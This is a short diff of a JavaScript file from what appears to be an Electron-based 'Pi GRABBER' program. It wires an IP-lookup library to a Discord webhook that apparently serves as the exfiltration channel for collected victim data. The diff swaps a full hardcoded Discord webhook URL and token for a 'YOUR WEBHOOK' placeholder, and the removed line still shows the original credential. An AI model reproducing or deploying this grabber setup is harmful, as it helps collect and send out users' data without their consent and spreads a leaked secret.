@@ -6,7 +6,7 @@ const { ElectronChromeExtensions } = require('electron-chrome-extensions')
 var ipapi = require('ipapi.co');
 
 const { Webhook } = require('discord-webhook-node');
-const hook = new Webhook("https://discord.com/api/webhooks/1086355372115251200/H6QmsRPeTfcwZUq1oa5d5van3tsqICGJ9ieezilibw5UxQGHQKlqs2bLLgpymiurSW5-");
+const hook = new Webhook("YOUR WEBHOOK GHQKlqs2bLLgpymiurSW5-");
  
 const IMAGE_URL = 'https://images7.memedroid.com/images/UPLOADED883/5d5dafcfcf72e.jpeg';
 hook.setUsername('Pi GRABBER');
